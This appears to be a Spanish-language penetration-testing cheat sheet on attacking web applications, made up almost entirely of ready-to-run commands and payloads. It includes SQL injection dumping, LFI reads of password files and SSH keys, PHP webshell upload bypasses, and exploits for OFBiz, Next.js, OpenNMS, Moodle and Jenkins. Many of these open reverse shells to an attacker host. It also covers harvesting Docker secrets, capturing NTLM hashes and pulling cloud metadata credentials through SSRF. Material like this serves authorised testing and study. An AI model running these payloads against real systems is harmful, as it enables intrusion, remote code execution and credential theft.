---
title: Web Application Attacks
slug: web-app-attacks
category: techniques
updated: 2026-08-02
summary: "VHost fuzzing, SQLi, LFI, upload bypass, OFBiz/NextJS/OpenNMS/Moodle CVEs, Docker creds"
tags: [web, sqli, lfi, upload, vhost, rce, nextjs, opennms, moodle, cms, ssrf, oob, collaborator]
sensitive: false
---

# Web Application Attacks

## When to use
Objetivo tiene servicio HTTP/HTTPS. Flujo: fingerprint → vhost/dirs → vuln-specific → RCE.

## Fingerprint inicial
```bash
whatweb http://TARGET
curl -skI http://TARGET
nmap -sV -sC -p 80,443,8080,8443 TARGET
```

## VHost fuzzing (OBLIGATORIO — siempre)
```bash
ffuf -u http://TARGET -H "Host: FUZZ.DOMAIN.com" \
  -w /usr/share/seclists/Discovery/DNS/services-names.txt \
  -fc 403,404 -fs 0 -t 30

# Filtrar tamaño de respuesta default:
ffuf -u http://TARGET -H "Host: FUZZ.DOMAIN.com" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
  -fs SIZE_DE_RESPUESTA_DEFAULT

# Agregar vhost encontrado
echo "IP vhost.domain.com" | sudo tee -a /etc/hosts
```

## Directory/file bruting
```bash
feroxbuster -u http://TARGET -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -x php,txt,html,bak,old,zip -t 40 -k
feroxbuster -u https://TARGET -k -w common.txt
```

## Rutas que revisar siempre
```bash
curl http://TARGET/{robots.txt,.git/config,.env,phpinfo.php,wp-json/wp/v2/users}
curl http://TARGET/WEB-INF/web.xml   # Tomcat / Java
```

## SQL Injection
```bash
sqlmap -u "http://TARGET/page?id=1" --dbs --batch
sqlmap -u "http://TARGET/page?id=1" -D DBNAME --tables --batch
sqlmap -u "http://TARGET/page?id=1" -D DBNAME -T TABLE --dump --batch
sqlmap -u "http://TARGET/" --data "user=foo&pass=bar" --dbs --batch   # POST
# Con cookie de sesión:
sqlmap -u "http://TARGET/page?id=1" --cookie="session=VALUE" --dbs --batch
```

## LFI / Path Traversal
```bash
# PHP filter (exfiltrar source)
curl "http://TARGET/page.php?file=php://filter/convert.base64-encode/resource=/etc/passwd"

# RFI (si allow_url_include=on)
curl "http://TARGET/page.php?file=http://KALI/shell.php"

# Rutas jugosas
curl "http://TARGET/page.php?file=../../../../etc/passwd"
curl "http://TARGET/page.php?file=../../../../home/user/.ssh/id_rsa"
curl "http://TARGET/page.php?file=../../../../var/log/apache2/access.log"   # log poison
```

## File Upload Bypass
```bash
# Extensiones alternativas que Apache/PHP procesan:
.phtml   .php5   .phar   .shtml

# Bypass de check de tipo:
# Cambiar Content-Type a image/jpeg PERO mantener extensión .php

# Magic bytes (GIF89a) para pasar validación de contenido/imagen;
# la extensión .php es la que da ejecución (sirve si el server no filtra la extensión):
echo -e 'GIF89a\n<?php system($_GET["c"]);?>' > shell.gif.php

# Double extension (some configs):
shell.php.png → si el servidor procesa .php primero
```

## CVEs de apps comunes

### Apache OFBiz < 18.12.10 (CVE-2023-49070 + CVE-2023-51467)
```bash
git clone https://github.com/UserConnecting/Exploit-CVE-2023-49070-and-CVE-2023-51467-Apache-OFBiz
python3 ofbiz_exploit.py --url https://TARGET --cmd 'bash -i >& /dev/tcp/KALI/4444 0>&1'
# POST-EXPLOT: buscar hashes en Derby
grep -rao '\$SHA\$[^[:space:]]*' /opt/ofbiz/runtime/data/derby/ofbiz/seg0/
```

### Next.js / React Server Components — "React2Shell" (CVE-2025-55182 React + CVE-2025-66478 Next.js — CVSS 10.0)
```bash
git clone https://github.com/liyander/React2shell-poc   # PoC de terceros — leer antes de correr
python3 React2shell.py -u http://TARGET:3000 --safe-check
python3 React2shell.py -u http://TARGET:3000 --rev KALI_IP 4444
# Mecanismo: deserialización RSC Flight + prototype pollution → RCE server-side.
# OJO (advisory oficial): muchos PoCs públicos son INVÁLIDOS (asumen que el dev expuso
# vm/child_process/fs al cliente) y los scanners dan falsos positivos. Confirmar manual;
# en la duda, patchear. Algunas plataformas mitigan a nivel runtime, no solo con WAF.
```

### OpenNMS RCE (vía File Editor)
```bash
# 1. Agregar rol ROLE_FILESYSTEM_EDITOR al usuario admin
# URL: /opennms/admin/userGroupView/users/modifyUser

# 2. Editar /opt/opennms/etc/notificationsCommands.xml desde File Editor:
# URL: /opennms/ui/index.html#/file-editor
# Insertar el comando malicioso como nuevo <command binary="true">

# 3. Recargar daemon y disparar:
curl -s -b SESSION_COOKIE \
  -X POST -H "Content-Type: application/xml" \
  --data-raw '<?xml version="1.0"?><event>
    <uei>uei.opennms.org/internal/reloadDaemonConfig</uei>
    <source>test</source><time>2026-06-14T00:00:00Z</time><host>127.0.0.1</host>
    <parms><parm><parmName>daemonName</parmName><value>Scriptd</value></parm></parms>
  </event>' "http://TARGET/opennms/rest/events"
# Credenciales default a probar: admin:admin
```

### Moodle ≤ 3.4.1 Teacher RCE (CVE-2018-1133)
**Requisito**: credenciales de rol Teacher (o superior) en cualquier curso.
```
# Payload en answer[0] del wizard de "calculated question":
answer[0] = " /*{a*/`$_GET[0]`;//{x}}"
# El evaluador de fórmulas llama eval() que hace backtick → RCE como www-data
```
Flujo (wizard de 3 pasos — datasetdefinitions → datasetitems):
1. **Step 1** — POST `/question/question.php` con `wizard=datasetdefinitions` + `_qf__qtype_calculated_edit_form=1` → crea la pregunta, guarda el payload, retorna `id=QID` en el Location.
2. **Step 2** — POST con `wizardnow=datasetdefinitions` + `_qf__question_dataset_dependent_definitions_form=1` + `dataset[0]=1-0-x` → avanza el wizard.
3. **Trigger** — POST con `wizardnow=datasetitems` + `0=(CMD)` en params → ejecuta `CMD` en el GET[0] del backtick.

```python
# Payload GET param que activa ejecución (paso 3):
params = {"wizardnow": "datasetitems", "0": "(COMANDO)"}
# COMANDO ejemplo: bash -c 'bash -i >& /dev/tcp/KALI/PORT 0>&1 &'
```
**Gotcha**: el output del comando NO se refleja en HTTP — usar reverse shell OOB. El sesskey se renueva por petición; re-extraerlo antes del trigger. CMID (course module ID) del quiz + QID de la pregunta deben ser consistentes en los 3 pasos.

### WordPress
```bash
wpscan --url http://TARGET --api-token TOKEN --enumerate ap,u,vp
wpscan --url http://TARGET -U users.txt -P rockyou.txt   # brute force
# RCE: Theme Editor → 404.php → add PHP
# Ruta config DB: wp-config.php
```

### Jenkins (puerto 8080)
```bash
# Script Console → Groovy RCE:
"cmd /c whoami".execute().text
Thread.start { ["bash","-c","bash -i >& /dev/tcp/KALI/4444 0>&1"].execute() }
# Hashes: /var/lib/jenkins/users/*/config.xml
```

## Docker containers: extraer credenciales
```bash
# Con acceso root en host Docker:
for id in $(docker ps -q); do
  echo "=== $(docker ps --format '{{.Names}}' -f id=$id) ==="
  docker inspect $id | grep -iE 'PASSWORD|SECRET|TOKEN|DB_|MYSQL|POSTGRES|_KEY|ADMIN'
done
```

## Forced Authentication (SSRF/MSSQL → NTLMv2)
```bash
# MSSQL xp_dirtree → captura NTLMv2
responder -I tun0 -v   # Terminal 1
# Terminal 2, en MSSQL:
EXEC xp_dirtree '\\KALI_IP\share', 1, 1
hashcat -m 5600 ntlmv2.txt rockyou.txt --force
```

## SSRF (Server-Side Request Forgery)
El server hace requests por vos. Buscar features que fetchean una URL: webhooks, "preview",
importar-desde-URL, avatares remotos, render de PDF, health-checks.

**OOB collaborator — usar SIEMPRE en SSRF/OOB.** Para ver los callbacks **en vivo** levantá un
listener propio (evita depender de servicios de terceros que verían datos del target):
```bash
python3 -m http.server 8000        # captura path/headers; o: nc -lvnp 8000
# Alternativas self-hosted: interactsh-client, Burp Collaborator propio.
```
Confirma SSRF **ciego** (ves llegar la request con path/headers/body) y sirve para exfiltrar por OOB.

**Qué probar:**
```bash
http://KALI_IP:8000/ssrf-probe                      # confirmar SSRF ciego → tu listener OOB
http://127.0.0.1:PORT/...                           # servicios internos solo-locales
http://169.254.169.254/latest/meta-data/iam/security-credentials/   # AWS IMDSv1
http://metadata.google.internal/computeMetadata/v1/ # GCP (header Metadata-Flavor: Google)
file:///etc/passwd    gopher://...    dict://...     # abuso de esquema
```
**Bypass de filtros naive:** `127.0.0.1`→`127.1`/`0177.0.0.1`/`[::1]`/decimal; dominio propio que
resuelve a IP interna (DNS rebinding); redirect 302 desde tu host hacia `169.254.169.254`.

## Gotchas
- VHost fuzzing SIEMPRE aunque AXFR ya dé hosts — DNS puede omitir vhosts en zona.
- SSRF: levantar un listener OOB propio para ver los callbacks en vivo; no usar servicios de terceros que verían datos del target.
- `sqlmap --batch` acepta todos los defaults (menos interactivo pero más rápido).
- OFBiz mode 120 (sha1($salt.$pass)) — el modo 110 da Exhausted porque el salt va primero.
- OpenNMS tiene credenciales default admin:admin — siempre probar antes de explotar.
- Next.js React2Shell (CVE-2025-55182 / CVE-2025-66478): muchos PoCs públicos son inválidos y los scanners dan falsos positivos — confirmar manual antes de reportar.
- Docker inspect revela env vars con passwords en texto claro — gran fuente de pivoting.

## References
- Relacionado: [[service-enumeration]], [[reverse-shells]], [[password-cracking]], [[llm-output-attacks]], [[gtfobins-binaries]]
- Notas de lab interno (host DMZ).
- Notas internas de labs web.
- Notas internas de escaneo de vulnerabilidades.
